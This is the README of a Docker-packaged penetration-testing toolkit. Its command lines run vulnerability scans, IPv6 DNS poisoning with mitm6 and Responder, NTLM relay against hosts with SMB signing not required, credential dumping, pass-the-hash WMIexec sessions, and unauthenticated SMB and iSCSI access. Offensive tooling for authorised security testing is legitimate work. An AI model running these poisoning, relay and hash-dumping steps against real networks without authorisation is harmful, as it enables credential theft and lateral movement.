# PETUSAWO

The purpose of the project is to make it easier to perform penetration testing by wrapping
up various important commands into bash scripts
  
## Supported Open Source Applications

- OWASP Zap
- NMAP
- Crackmapexec
- mitm6
  
## Getting Started

### Dependencies

- Docker

### Building the image

To build the image execute the following command at the root of the repo:

```bash
docker-compose build
```

### Executing the docker image

### Before getting started

Throughout this repository, we refer to "list_of_ips". To pass a list of IPs to any command,
create a text file in the directory from which the docker command will be run. Ensure that
you list one IP per line in the textfile, for example.

```
198.1.2.220
198.1.3.221
```

The you can pass the file name as command line argument to the tool.
### ZAP

To run zap against a url, run the following command, replacing the url with the target url.
The results will be outputted to whatever directory you specify.

```bash
docker run --rm -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
zap_vuln_scan https://yourtarget.com/
```

To run Zap against a list of URLs, place the urls in file named urls.txt in the `PWD` with each url
on a new line (the last line must be terminated with a new line). Run:

```bash
docker run --rm -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
zap_vuln_scan your_list.txt
```

### NMAP

Example of running NMAP's vulnerability scan against an IP address:

```bash
docker run --rm -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
nmap_vuln_scan 000.00.000.000
```

To run NMAP's vulnerability scan against a list of ip addresses, place
the list in a file named ips.txt in the `PWD` with each IP address on a new line
(the last line must be terminated with a new line).
Run:

```bash
docker run --rm -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
nmap_vuln_scan your_list.txt
```

### General WEB Application Scans

All web application scans can be run through an optional proxy server such as burpsuite.
If no proxy is being used, the option can be ignored.

```bash
docker run --rm -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
run_web_app_tests target_ip_address_or_list_of_ips optional_proxy_address
```

### Check for IPV6 traffic

```bash
screen -S tshark -d -m docker run -it --rm --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
check_for_ipv6_traffic network_interface to listen on
```

You can interact with the above screen with the command:
```
screen -r tshark
```
### Checking if SMB signing is not required

```bash
docker run --rm -it -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest check_if_smb_signing_is_required smb_targets.txt
```

### Exploit SMB signing not required via DNS6 poisoning and NTLM relay.

If Ipv6 is not being actively managed by a DNS and DHCP server and IPv6 packets are flowing then we can likely
compromise this network by setting up a DNS server and DHCP server for IPv6. It is worth noting that according to [RFC3484](https://www.ietf.org/rfc/rfc3484.txt)

IPv6 will be preferred over IPv4 which means that once IPv6 is being managed, nodes on the network will send packets via IPv6 as
opposed to IPV4.

By default, windows hosts will send a DHCP discovery packet to try to discover DHCP servers and we will take advantage of this by responding using 
mitm6

```bash
screen -S mitm6 -d -m  docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
start_mitm6 local_network_interface target_domain_name
```

You can interact with the above screen with the command:
```
screen -r mitm6
```

```bash
screen -S ipv6_relay -d -m  docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
start_nltm_relay_ipv6 target_ip_address_or_list_of_ips
```

You can interact with the above screen with the command:

```
screen -r ipv6_relay
```

You can check if SMB sessions have been created successfully by resuming the `relay_ipv6`
screen and running the `socks` command

If SMB sessions have been created, you can perform a number of actions going forward using proxychains:


- Dumping hashes

The domain/account used in the command below can be retrieved by resuming the `relay_ipv6` screen (see above) and
running the `socks` command

    ```bash
    docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest dump_creds DOMAIN/Account@x.x.x.x
    ```

- List SMB shares

```bash
    docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest list_smb_shares ip_address_of_target DOMAIN\\Account
```

- Accessing SMB shares

```bash
    docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest access_smb \\\\ip_address_of_target\\c$ DOMAIN\\Account
```
- Passing hashes for a WMIexec session

NOTE: username must be in lowercase

```bash

docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest pass_hashes_wmi_exec hashes username@x.x.x.x
```


### Exploit SMB signing not required via DNS poisoning and NTLM relay.

```bash

screen -S responder -d -m  docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
start_responder local_network_interface
```

You can interact with the above screen with the command:
```
screen -r responder
```

```bash
screen -S ipv4_relay -d -m  docker run --rm -it --network host -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
start_nltm_relay_ipv4 target_ip_address_or_list_of_ips
```

You can interact with the above screen with the command:

```
screen -r ipv4_relay
```

### Checking for and exploit null SMB Sessions

```bash
docker run -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
check_and_exploit_null_smb_sessions target_ip_address_or_list_of_ips
```

### List ISCSI targets

```bash
docker run -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
list_iscsi_targets target_ip_address_or_list_of_target_ips
```

### Connect to ISCSI targets without authentication

```bash
docker run -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
test_unauthenticated_iscsi_sessions target_ip_address_or_list_of_target_ips iscsi_target
```

### Utilities

Resolve IPs to FQDNS

```bash
docker run -v "$(pwd)":/RESULTS berryliumsec/petusawo:latest \
resolve_fqdn target_ip_address_or_list_of_target_ips 
```

Assume role with MFA

```bash
. ./assume_role_with_mfa arn:aws:iam::XXXXXXX:role/assume_role_test session_name arn:aws:iam::xxxxxxx:mfa/xxxx 0000(your_mfa_code)
```

Assume role without MFA

```bash
. ./assume_role_with_mfa arn:aws:iam::XXXXXXX:role/assume_role_test session_name
```

Get Session Token and Assume Role

```bash
. ./get_session_token arn:aws:iam::XXXXXX:mfa/xxxx 0000(your_mfa_code)
```
### Output Files

All log files will be placed in the directory from which you run the docker container.
